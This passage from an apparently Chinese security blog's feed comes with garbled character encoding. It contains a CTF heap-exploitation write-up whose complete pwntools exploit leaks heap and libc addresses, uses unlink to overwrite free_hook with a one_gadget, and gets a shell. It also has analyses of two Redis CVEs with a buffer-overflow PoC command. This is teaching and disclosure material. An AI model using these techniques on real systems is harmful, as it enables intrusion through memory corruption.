src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821173300.png"></a></p><p>ç„¶åshowï¼Œå°±èƒ½è·å¾— libc baseã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Edit(<span class="number">0</span>, p64(heap_addr + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">6</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">1</span>)</span><br><span class="line">libc_address = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#123;&#125;&#x27;</span>.format(hex(libc_address)))</span><br></pre></td></tr></table></figure><h4 id="ç¬¬å››æ­¥-é€šè¿‡unlink-uaf-æ¥è·å¾—ä¸€ä¸ªä»»æ„åœ°å€å†™"><a href="#ç¬¬å››æ­¥-é€šè¿‡unlink-uaf-æ¥è·å¾—ä¸€ä¸ªä»»æ„åœ°å€å†™" class="headerlink" title="ç¬¬å››æ­¥ é€šè¿‡unlink + uaf  æ¥è·å¾—ä¸€ä¸ªä»»æ„åœ°å€å†™"></a>ç¬¬å››æ­¥ é€šè¿‡unlink + uaf  æ¥è·å¾—ä¸€ä¸ªä»»æ„åœ°å€å†™</h4><p>æˆ‘ä»¬ç°åœ¨å·²ç»æœ‰äº†åŸºæœ¬çš„ä¿¡æ¯ã€‚æ€è·¯æ˜¯ä¿®æ”¹ freehook æˆone_gadget ã€‚ç„¶åè¿›è¡Œä¸€æ¬¡freeå°±èƒ½getshellã€‚</p><p>è¦è¾¾åˆ°è¿™ç§æ•ˆæœï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªä»»æ„åœ°å€å†™ã€‚</p><p>æˆ‘ä»¬ä¹‹å‰ free chunk 1 æ¥è·å¾—ä¸€ä¸ªlibc åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœé¡ºä¾¿åŒè¿‡ unlink æ¥è·å¾—ä¸€ä¸ª ä»»æ„åœ°å€å†™ä¸ä¸Šåˆšå¥½ä¹ˆã€‚æ‰€ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">0</span>,<span class="string">&#x27;AAAAAAAA\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">1</span>,<span class="string">&#x27;BBBBBBBB\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">2</span>,<span class="string">&#x27;CCCCCCCC\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">3</span>,<span class="string">&#x27;DDDDDDDD\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">4</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x10</span>))</span><br><span class="line">Add(<span class="number">5</span>, p64(<span class="number">0x30</span>) + p64(<span class="number">0x30</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>chunk 2 chunk 3 æ˜¯ç”¨æ¥ä¿®æ”¹ chunk1 size è®© chunk 1 æ¥åå¹¶çš„ã€‚å½“ free chunk 1çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ„é€ å¥½ unlink çš„å‰æï¼ˆç°ä»£ unlink æœ‰æ£€æŸ¥ã€‚ï¼‰fake çš„ fd  == 0x602080-0x18 åˆšå¥½æ˜¯ ptr[] æ•°ç»„ä¸­ï¼Œchunk 1 çš„ä½ç½®ã€‚ä¹Ÿæ˜¯ä¹‹å new chunk 4 çš„ä½ç½®ã€‚</p><p>å½“é€šè¿‡unlink åæˆ‘ä»¬å¾—åˆ°ä¸€ä¸ª chunk æŒ‡å‘äº† chunk1 åŒæ—¶ chunk 4 ä¹ŸæŒ‡å‘äº† chunk1ã€‚ è¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬é˜Ÿchunk 1è¿™å—å†…å­˜ å†™å…¥ free_hook çš„åœ°å€ï¼Œç„¶åå†é€šè¿‡uaf ä¿®æ”¹è¿™ä¸ªåœ°å€æ‰€æŒ‡çš„å€¼ï¼Œå†™æˆä¸€ä¸ª one_gadget å°±èƒ½getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Edit(<span class="number">4</span>,p64(libc_address + <span class="number">0x3c67a8</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(libc_address + one_gadget)[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821180457.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180821180457.png"></a></p><h3 id="0x03-å®Œæ•´-exp"><a href="#0x03-å®Œæ•´-exp" class="headerlink" title="0x03 å®Œæ•´ exp"></a>0x03 å®Œæ•´ exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> mypwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p,elf,libc = init_pwn(<span class="string">&#x27;./babyheap&#x27;</span>,<span class="string">&#x27;./libc.so.6&#x27;</span>,remote_detail = (<span class="string">&#x27;106.75.67.115&#x27;</span>,<span class="number">9999</span>),is_env = <span class="literal">False</span>)</span><br><span class="line">breakpoint = [<span class="number">0x400D59</span>,<span class="number">0x400D65</span>,<span class="number">0x0400D7D</span>,<span class="number">0x400D71</span>]</span><br><span class="line">malloc_hook = <span class="number">0x3C4B10</span></span><br><span class="line">one_gadget = <span class="number">0x4526A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>,<span class="string">&#x27;AAAAAAAA\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">1</span>,<span class="string">&#x27;BBBBBBBB\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">2</span>,<span class="string">&#x27;CCCCCCCC\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">3</span>,<span class="string">&#x27;DDDDDDDD\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">4</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602080</span> - <span class="number">0x10</span>))</span><br><span class="line">Add(<span class="number">5</span>, p64(<span class="number">0x30</span>) + p64(<span class="number">0x30</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap addr</span></span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_addr:&#123;&#125;&#x27;</span>.format(hex(heap_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># # leak libc</span></span><br><span class="line"><span class="comment"># init_debug(p,breakpoint)</span></span><br><span class="line"><span class="comment"># raw_input(&#x27;wait to debug&#x27;)</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(heap_addr + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">6</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Add(<span class="number">7</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">1</span>)</span><br><span class="line">libc_address = u64(p.recvline()[ : <span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_addr:&#123;&#125;&#x27;</span>.format(hex(libc_address)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">init_debug(p,breakpoint)</span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">Edit(<span class="number">4</span>,p64(libc_address + <span class="number">0x3c67a8</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(libc_address + one_gadget)[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ç½‘é¼æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis CVE-2018-12326 åˆ†æ</title>
      <link href="redis-CVE-2018-12326-analysis.html"/>
      <url>redis-CVE-2018-12326-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="redis-CVE-2018-12326-åˆ†æ"><a href="#redis-CVE-2018-12326-åˆ†æ" class="headerlink" title="redis CVE-2018-12326 åˆ†æ"></a>redis CVE-2018-12326 åˆ†æ</h2><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å½±å“ç‰ˆæœ¬: Redis 3.2.x-3.2.4.</p><p>åˆ†æç‰ˆæœ¬: 5.0, 4.0, 3.2</p><p>ç¯å¢ƒï¼šubuntu 17.10</p><h3 id="0x01-æ¼æ´ç±»å‹"><a href="#0x01-æ¼æ´ç±»å‹" class="headerlink" title="0x01 æ¼æ´ç±»å‹"></a>0x01 æ¼æ´ç±»å‹</h3><p>æ•´å‹æº¢å‡ºå¯¼è‡´ç¼“å†²åŒºæº¢å‡º</p><h3 id="0x02-æ¼æ´åŸç†"><a href="#0x02-æ¼æ´åŸç†" class="headerlink" title="0x02 æ¼æ´åŸç†"></a>0x02 æ¼æ´åŸç†</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">cliRefreshPrompt</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (config.eval_ldb) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (config.hostsocket != <span class="literal">NULL</span>)</span><br><span class="line">        len = <span class="built_in">snprintf</span>(config.prompt,<span class="keyword">sizeof</span>(config.prompt),<span class="string">&quot;redis %s&quot;</span>,</span><br><span class="line">                       config.hostsocket);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        len = anetFormatAddr(config.prompt, <span class="keyword">sizeof</span>(config.prompt),</span><br><span class="line">                           config.hostip, config.hostport);</span><br><span class="line">    <span class="comment">/* Add [dbnum] if needed */</span></span><br><span class="line">    <span class="keyword">if</span> (config.dbnum != <span class="number">0</span>)</span><br><span class="line">        len += <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;[%d]&quot;</span>,</span><br><span class="line">            config.dbnum);</span><br><span class="line">    <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œæµåˆ°è¾¾</p><p><code>len = anetFormatAddr(config.prompt, sizeof(config.prompt), config.hostip, config.hostport);</code>çš„æ—¶å€™ï¼Œå‚æ•°é•¿åº¦ç”± anetFormatAddrå†³å®šã€‚å½“æˆ‘ä»¬çš„è¾“å…¥è¶³å¤Ÿå¤§çš„æ—¶å€™ï¼Œ<code>sizeof(config.prompt)-len</code> å˜å‘ç”Ÿæ•´å‹æº¢å‡º</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180157.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180157.png"></a></p><p>å¦‚ä¸Šå›¾ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (config.dbnum != <span class="number">0</span>)</span><br><span class="line">        len += <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;[%d]&quot;</span>,</span><br><span class="line">            config.dbnum);</span><br><span class="line">    <span class="built_in">snprintf</span>(config.prompt+len,<span class="keyword">sizeof</span>(config.prompt)-len,<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¼šé€šè¿‡  <code>snprintf</code>  è¿™ä¸ªå‡½æ•°å‘ <code>config.prompt+len</code>å†™å…¥ä¸œè¥¿ç”±äºlenæ˜¯å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å‘æŒ‡å®šä½ç½®å†™å…¥ï¼Œä½†æ˜¯å†™å…¥çš„ä¸œè¥¿å´æ˜¯ä¸å¯æ§çš„ï¼Œä»–å‘ <code>config.prompt+len</code>    çš„ä½ç½®å†™å…¥çš„ä¸œè¥¿æ˜¯ å­—ç¬¦ <strong>&gt;</strong></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180515.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180515.png"></a></p><p>å¦‚å›¾ï¼Œç”±äºå†™å…¥å‚æ•°ä¸å¯æ§åˆ¶ï¼Œè¿™ä¸ªCVE ä¾æ—§æ— æ³•åšåˆ°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><h3 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r  -h `python -c <span class="string">&#x27;print &quot;A&quot; * 340&#x27;</span>`</span><br></pre></td></tr></table></figure><h3 id="0x04-æ¼æ´ä¿®å¤"><a href="#0x04-æ¼æ´ä¿®å¤" class="headerlink" title="0x04 æ¼æ´ä¿®å¤"></a>0x04 æ¼æ´ä¿®å¤</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180728.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180801180728.png"></a></p><p>ä¿®å¤åæŠŠlençš„è·å–ä¿®æ”¹äº†ã€‚</p><h3 id="0x05-ç–‘é—®"><a href="#0x05-ç–‘é—®" class="headerlink" title="0x05 ç–‘é—®"></a>0x05 ç–‘é—®</h3><p>è¿™ä¸ªCVE åœ¨<a href="https://www.exploit-db.com/exploits/44904/">exp-db</a>çš„æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Redis-cli &lt; 5.0 - Buffer Overflow (PoC)</span><br><span class="line"># Date: 2018-06-13</span><br><span class="line"># Exploit Author: Fakhri Zulkifli</span><br><span class="line"># Vendor Homepage: https://redis.io/</span><br><span class="line"># Software Link: https://redis.io/download</span><br><span class="line"># Version: 5.0, 4.0, 3.2</span><br><span class="line"># Fixed on: 5.0, 4.0, 3.2</span><br><span class="line"># CVE : CVE-2018-12326</span><br><span class="line"> </span><br><span class="line"># Buffer overflow in redis-cli of Redis version 3.2, 4.0, and 5.0 allows a local attacker</span><br><span class="line"># to achieve code execution and escalate to higher privileges via a long string in the hostname parameter.</span><br></pre></td></tr></table></figure><p>æè¿°ä¸­è¯´äº†å¯ä»¥ ä»£ç æ‰§è¡Œï¼Œä½†æ˜¯åœ¨æˆ‘çš„åˆ†æä¸­ï¼Œè¿™ä¸ªæº¢å‡ºä¼¼ä¹æ˜¯ä¸å¯æ§çš„ã€‚å¦‚æœæœ‰äººå‘ç°è¿™ä¸ªæœ‰ä»£ç æ‰§è¡Œçš„å¯èƒ½æ€§æˆ–è€…æ–¹æ³•è¯·å‘ŠçŸ¥ã€‚</p><p>Emal: <code>bestswngs@gmail.com</code></p><h3 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h3></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> CVE-2018-12326 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis CVE-2016-8339 åˆ†æ</title>
      <link href="Redis-CVE-2016-8339-analysis.html"/>
      <url>Redis-CVE-2016-8339-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="Redis-CVE-2016-8339-åˆ†æ"><a href="#Redis-CVE-2016-8339-åˆ†æ" class="headerlink" title="Redis CVE-2016-8339 åˆ†æ"></a>Redis CVE-2016-8339 åˆ†æ</h3><h3 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h3><p>å½±å“ç‰ˆæœ¬: Redis 3.2.x-3.2.4.</p><p>åˆ†æç‰ˆæœ¬: Redis 3.2.0</p><p>ç¯å¢ƒï¼šubuntu 17.10</p><p><code>git  clone https://github.com/antirez/redis.git</code></p><p>åˆ‡æ¢åˆ°å†å²ç‰ˆæœ¬</p><p><code>git reset --hard 670586715a19e7aff </code></p><h3 id="0x01-æ¼æ´ç±»å‹ï¼šæ•°ç»„è¶Šç•Œ"><a href="#0x01-æ¼æ´ç±»å‹ï¼šæ•°ç»„è¶Šç•Œ" class="headerlink" title="0x01 æ¼æ´ç±»å‹ï¼šæ•°ç»„è¶Šç•Œ"></a>0x01 æ¼æ´ç±»å‹ï¼šæ•°ç»„è¶Šç•Œ</h3><p>æ•°ç»„ä¸‹æ ‡è¶Šç•Œå¯¼è‡´æº¢å‡ºï¼ˆRedisæ˜¯ä½¿ç”¨æ ‡å‡†Cè¯­è¨€å¼€å‘çš„ï¼‰ã€‚</p><h3 id="0x02-æ¼æ´åŸç†ï¼š"><a href="#0x02-æ¼æ´åŸç†ï¼š" class="headerlink" title="0x02 æ¼æ´åŸç†ï¼š"></a>0x02 æ¼æ´åŸç†ï¼š</h3><p>åœ¨ Redis ä¸­ï¼Œ<code>CONFIG SET parameter value</code> å‘½ä»¤å¯ä»¥åŠ¨æ€çš„ä¿®æ”¹æœåŠ¡å™¨é…ç½®ï¼Œè€Œæ— éœ€é‡å¯ã€‚å…¶ä¸­ï¼Œæœ‰ä¸€æ¡å‘½ä»¤<code>CONFIG SET client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;  </code> å¯ä»¥ç»™å½“å‰æœªè¿æ¥åˆ°æœåŠ¡ç«¯çš„æŸä¸€ç±»å®¢æˆ·ç«¯è®¾ç½®â€å®¢æˆ·ç«¯è¾“å‡ºç¼“å†²åŒºé™åˆ¶â€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Finally set the new config */</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; vlen; j += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> hard, soft;</span><br><span class="line">        <span class="keyword">int</span> soft_seconds;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> = <span class="title">getClientTypeByName</span>(<span class="title">v</span>[<span class="title">j</span>]);</span> <span class="comment">//è¿”å›å€¼ -1 åˆ° 3</span></span><br><span class="line">        hard = strtoll(v[j+<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">10</span>);</span><br><span class="line">        soft = strtoll(v[j+<span class="number">2</span>],<span class="literal">NULL</span>,<span class="number">10</span>);</span><br><span class="line">        soft_seconds = strtoll(v[j+<span class="number">3</span>],<span class="literal">NULL</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">hard_limit_bytes</span> = <span class="title">hard</span>;</span></span><br><span class="line">        server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_bytes</span> = <span class="title">soft</span>;</span></span><br><span class="line">        server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_seconds</span> = <span class="title">soft_seconds</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">    sdsfreesplitres(v,vlen);</span><br><span class="line">&#125; config_set_special_field(<span class="string">&quot;notify-keyspace-events&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> flags = keyspaceEventsStringToFlags(o-&gt;ptr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flags == <span class="number">-1</span>) <span class="keyword">goto</span> badfmt;</span><br><span class="line">    server.notify_keyspace_events = flags;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>getClientTypeByName </code>å‡½æ•°å¯ä»¥è·å–ç±»å‹ï¼Œæˆ‘ä»¬è½¬åˆ°è¿™ä¸ªå‡½æ•°çš„å®šä¹‰å¯ä»¥å‘ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getClientTypeByName</span><span class="params">(<span class="keyword">char</span> *name)</span> </span>&#123;</span><br><span class="line">    <span 